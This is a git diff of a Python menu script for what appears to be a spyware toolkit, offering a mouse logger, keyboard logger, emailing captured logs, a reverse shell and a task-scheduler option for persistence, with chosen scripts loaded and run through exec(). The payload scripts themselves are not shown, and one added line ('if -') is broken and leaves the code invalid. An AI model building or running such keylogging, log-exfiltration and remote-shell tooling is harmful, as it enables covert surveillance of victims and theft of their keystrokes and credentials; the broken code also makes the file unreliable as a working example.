@@ -1,4 +1,3 @@
-from distutils.command import build
 from logger import send_logs as sl
 import os
 from termcolor import colored
@@ -31,8 +30,9 @@ print(colored("PRESS 'm' FOR MOUSE LOGGER", 'blue'))
 print(colored("PRESS 'k' FOR KEYBOARD LOGGER", 'blue'))
 print(colored("PRESS 'e' TO SEND LOGS TO EMAIL", 'blue'))
 print(colored("PRESS 's' TO START A REVERSE SHELL", 'blue'))
-print(colored("PRESS 't' TO SETUP TASK SCHEDULER", 'blule'))
+print(colored("PRESS 't' TO SETUP TASK SCHEDULER", 'blue'))
 print(colored("PRESS ANY OTHER KEY TO EXIT PROGRAM", 'blue'))
+print(colored("ADD a '-s <interval_in_seconds>' IF YOU WANT TO SCHEDULE TASK", 'red'))
 choice = input()
 print("\n\n")
 print(
@@ -46,11 +46,14 @@ if not os.path.exists(output_path):
 
 # Reads file based on user's choice, then takes python script inside it, and runs it
 if choice == 'm':
-    mouse_logger = open("logger/mouse_logging.py")
+    # TODO Add if statement for different operating systems
+    mouse_logger = open(output_path + '/mouse_logging.py')
+    mouse_logger_file = open("logger/mouse_logging.py")
     exec(mouse_logger.read())
 
 elif choice == 's':
     data = open("tools/main.py")
+    if -
 
 elif choice == 'k':
     keyboard_logger = open("key_logging.py")
@@ -93,9 +96,6 @@ elif choice == 'e':
         sl.send_email("Keyboard Logs", sl.logs1, email)
         sl.send_email("Mouse Logs", sl.logs2, email)
         print("Sent Logs to " + email)
-
-elif choice == 't':
-    print(colored('[*] SCHEDULER', 'blue'))
 
 else:
     print("\n\n")
